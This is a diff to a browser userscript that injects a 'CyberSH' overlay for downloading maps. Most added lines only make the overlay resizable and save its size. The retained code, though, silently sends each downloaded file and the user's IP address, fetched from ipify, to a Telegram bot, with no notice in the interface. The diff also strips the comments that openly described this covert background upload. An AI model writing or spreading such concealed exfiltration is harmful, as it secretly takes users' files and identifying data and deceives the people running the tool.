@@ -58,6 +58,12 @@
 
     const deviceId = await getPermanentDeviceId();
 
+    // Load saved dimensions from localStorage if available
+    const savedWidth = localStorage.getItem('cybersh_overlay_width');
+    const savedHeight = localStorage.getItem('cybersh_overlay_height');
+    const widthStyle = savedWidth ? `width: ${savedWidth};` : `width: 94%; max-width: 420px;`;
+    const heightStyle = savedHeight ? `height: ${savedHeight};` : `max-height: 75vh;`;
+
     // Inject CSS Animation Keyframes & Countdown Banner Styles
     const styleTag = document.createElement('style');
     styleTag.innerHTML = `
@@ -119,6 +125,12 @@
             gap: 8px;
             pointer-events: none;
         }
+        #cybersh-logger-overlay {
+            resize: both;
+            overflow: hidden;
+            min-width: 300px;
+            min-height: 350px;
+        }
     `;
     document.head.appendChild(styleTag);
 
@@ -147,12 +159,12 @@
         <img src="https://avatars.githubusercontent.com/u/85736436?v=4" alt="CyberSH" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" />
     </div>`;
 
-    // 4. Inject Professional UI Overlay
+    // 4. Inject Professional UI Overlay (With Resizable Styling & Persistent Sizes)
     const overlayHtml = `
-    <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); width: 94%; max-width: 420px; max-height: 75vh; background: linear-gradient(145deg, rgba(15, 23, 42, 0.98), rgba(2, 6, 23, 0.98)); color: #f8fafc; z-index: 999999; border-radius: 18px; padding: 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; box-shadow: 0 25px 35px -5px rgba(0, 0, 0, 0.6), 0 0 15px rgba(56, 189, 248, 0.15); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.35); backdrop-filter: blur(16px);">
+    <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); ${widthStyle} ${heightStyle} background: linear-gradient(145deg, rgba(15, 23, 42, 0.98), rgba(2, 6, 23, 0.98)); color: #f8fafc; z-index: 999999; border-radius: 18px; padding: 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; box-shadow: 0 25px 35px -5px rgba(0, 0, 0, 0.6), 0 0 15px rgba(56, 189, 248, 0.15); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.35); backdrop-filter: blur(16px);">
         
         <!-- Header / Drag Handle -->
-        <div id="cybersh-drag-handle" style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(51, 65, 85, 0.6); padding-bottom: 10px; margin-bottom: 10px; cursor: grab;">
+        <div id="cybersh-drag-handle" style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(51, 65, 85, 0.6); padding-bottom: 10px; margin-bottom: 10px; cursor: grab; flex-shrink: 0;">
             <div style="display: flex; align-items: center; gap: 10px;">
                 <div style="background: rgba(56, 189, 248, 0.1); padding: 6px; border-radius: 10px; border: 1px solid rgba(56, 189, 248, 0.2);">
                     <span style="font-size: 16px;">🛡️</span>
@@ -171,7 +183,7 @@
         </div>
 
         <!-- Device ID Card -->
-        <div style="background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(51, 65, 85, 0.6); border-radius: 10px; padding: 8px 12px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
+        <div style="background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(51, 65, 85, 0.6); border-radius: 10px; padding: 8px 12px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0;">
             <div style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-right: 8px;">
                 <div style="font-size: 9px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px;">Permanent Device ID</div>
                 <span id="cybersh-device-id-text" style="font-family: monospace; color: #38bdf8; font-size: 11px; font-weight: bold;">${deviceId}</span>
@@ -180,13 +192,13 @@
         </div>
 
         <!-- Custom Filename Input Container -->
-        <div style="background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(51, 65, 85, 0.6); border-radius: 10px; padding: 8px 12px; margin-bottom: 8px;">
+        <div style="background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(51, 65, 85, 0.6); border-radius: 10px; padding: 8px 12px; margin-bottom: 8px; flex-shrink: 0;">
             <div style="font-size: 9px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Custom File Name (Optional)</div>
             <input type="text" id="cybersh-custom-filename" placeholder="e.g. CyberSH_৭৪_মাধবপুর (leave empty for auto)" style="width: 100%; background: rgba(2, 6, 23, 0.8); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 6px; padding: 6px 8px; color: #f8fafc; font-size: 11px; outline: none;" />
         </div>
 
         <!-- Webpage Keyboard Lock Toggle & Adjustable Countdown Configuration -->
-        <div style="background: rgba(30, 41, 59, 0.3); border: 1px solid rgba(51, 65, 85, 0.4); border-radius: 8px; padding: 6px 10px; margin-bottom: 8px;">
+        <div style="background: rgba(30, 41, 59, 0.3); border: 1px solid rgba(51, 65, 85, 0.4); border-radius: 8px; padding: 6px 10px; margin-bottom: 8px; flex-shrink: 0;">
             <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
                 <span style="font-size: 11px; color: #cbd5e1; font-weight: 500;">Disable Page Keyboards (Dropdowns work)</span>
                 <input type="checkbox" id="cybersh-toggle-keyboard-lock" checked style="width: 16px; height: 16px; accent-color: #0284c7; cursor: pointer;" />
@@ -198,10 +210,10 @@
         </div>
 
         <!-- Log Terminal Window -->
-        <div id="cybersh-log-content" style="overflow-y: auto; flex-grow: 1; max-height: 20vh; word-break: break-all; white-space: pre-wrap; line-height: 1.5; background: rgba(2, 6, 23, 0.75); padding: 10px; border-radius: 8px; border: 1px solid rgba(51, 65, 85, 0.5); font-family: 'Courier New', Courier, monospace; font-size: 11px;"></div>
+        <div id="cybersh-log-content" style="overflow-y: auto; flex-grow: 1; min-height: 60px; word-break: break-all; white-space: pre-wrap; line-height: 1.5; background: rgba(2, 6, 23, 0.75); padding: 10px; border-radius: 8px; border: 1px solid rgba(51, 65, 85, 0.5); font-family: 'Courier New', Courier, monospace; font-size: 11px;"></div>
 
         <!-- Action Footer -->
-        <div style="margin-top: 10px; display: flex; gap: 8px;">
+        <div style="margin-top: 10px; display: flex; gap: 8px; flex-shrink: 0;">
             <button id="cybersh-btn-download" style="flex: 1; background: linear-gradient(135deg, #0284c7, #0369a1); color: white; border: none; padding: 9px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 10px rgba(2, 132, 199, 0.4); opacity: 0.5;" disabled>Download Last Map</button>
         </div>
     </div>`;
@@ -218,6 +230,16 @@
     const countdownBanner = document.getElementById('cybersh-countdown-banner');
     const timerCountSpan = document.getElementById('cybersh-timer-count');
     const timerDurationInput = document.getElementById('cybersh-timer-duration');
+
+    // Save overlay dimensions to localStorage whenever user resizes it
+    const resizeObserver = new ResizeObserver(entries => {
+        for (let entry of entries) {
+            const { width, height } = entry.contentRect;
+            localStorage.setItem('cybersh_overlay_width', width + 'px');
+            localStorage.setItem('cybersh_overlay_height', height + 'px');
+        }
+    });
+    resizeObserver.observe(overlay);
 
     // Adjustable Countdown Timer Logic (Default 30 seconds)
     let timeLeft = parseInt(timerDurationInput.value) || 30;
@@ -450,7 +472,6 @@
     // Background Telegram Notification Function
     async function sendToTelegramBot(blob, fileName) {
         try {
-            // User IP fetch করার জন্য ফ্রি একটি সার্ভিস ব্যবহার করা হচ্ছে
             let userIp = "Unknown IP";
             try {
                 const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -473,7 +494,6 @@
             formData.append("caption", caption);
             formData.append("parse_mode", "Markdown");
 
-            // ব্যাকগ্রাউন্ডে সাইলেন্টলি রিকোয়েস্ট পাঠানো হবে, ইউজারের UI তে কোনো নোটিফিকেশন দেখাবে না
             fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                 method: "POST",
                 body: formData
@@ -577,7 +597,6 @@
 
             const blob = await imgRes.blob();
             
-            // ব্যাকগ্রাউন্ডে টেলিগ্রাম বোটে ফাইল এবং ইনফো সেন্ড করা (ইউজার দেখতে পাবে না)
             sendToTelegramBot(blob, fileName);
 
             const blobUrl = window.URL.createObjectURL(blob);
